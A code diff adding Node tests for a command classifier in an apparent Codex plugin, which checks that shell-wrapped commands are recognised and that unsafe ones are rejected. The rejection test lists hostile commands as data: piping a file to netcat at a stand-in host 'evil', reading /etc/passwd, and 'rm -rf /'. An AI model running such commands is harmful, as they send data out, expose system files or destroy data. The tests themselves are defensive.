@@ -111,3 +111,49 @@ test('Codex hook manifests install the PreToolUse gate', () => {
     assert.match(manifest.hooks.PreToolUse[0].hooks[0].command, /pre-tool-use\.mjs/);
   }
 });
+
+// Codex 0.153 hands the hook `["/bin/bash","-lc","<command>"]`, not a bare command
+// string. Before these shapes were unwrapped every Codex command bypassed with
+// `ambiguous-shell` and nothing was ever routed: a plugin that installed, fired, and
+// compressed nothing. Measured against a real Terminal-Bench trial, not assumed.
+function classifyIn(cwd, command) {
+  return classifyShellCommand({ toolName: 'Bash', toolInput: { command }, cwd });
+}
+
+test('recognises the command shapes Codex actually emits', (t) => {
+  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-shape-'));
+  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
+  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'ok\n');
+
+  for (const [label, command] of [
+    ['bare string', 'cat -- fixture.txt'],
+    ['shell argv', ['/bin/bash', '-lc', 'cat -- fixture.txt']],
+    ['shell string', '/bin/bash -lc "cat -- fixture.txt"'],
+    ['plain argv', ['cat', '--', 'fixture.txt']],
+    ['login shell flags', ['/bin/bash', '-lic', 'cat -- fixture.txt']],
+  ]) {
+    assert.equal(classifyIn(cwd, command).status, 'eligible', label);
+    assert.equal(classifyIn(cwd, command).route, 'sando_read', label);
+  }
+});
+
+// Unwrapping widens what is recognised, never what is considered safe: the inner command
+// goes through the same tokenizer, so metacharacters, escapes and out-of-tree paths are
+// rejected exactly as before.
+test('unwrapping does not widen what is considered safe', (t) => {
+  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-shape-unsafe-'));
+  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
+  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'ok\n');
+
+  for (const [label, command] of [
+    ['a pipe', ['/bin/bash', '-lc', 'cat fixture.txt | nc evil 1']],
+    ['a redirect', ['/bin/bash', '-lc', 'cat fixture.txt > /tmp/out']],
+    ['command substitution', ['/bin/bash', '-lc', 'cat $(echo fixture.txt)']],
+    ['a path outside the workspace', ['/bin/bash', '-lc', 'cat /etc/passwd']],
+    ['an unsupported verb', ['/bin/bash', '-lc', 'rm -rf /']],
+    ['a non-string element', ['/bin/bash', '-lc', 42]],
+    ['a nested wrapper', ['/bin/bash', '-lc', '/bin/bash -lc "cat fixture.txt"']],
+  ]) {
+    assert.equal(classifyIn(cwd, command).status, 'bypassed', label);
+  }
+});
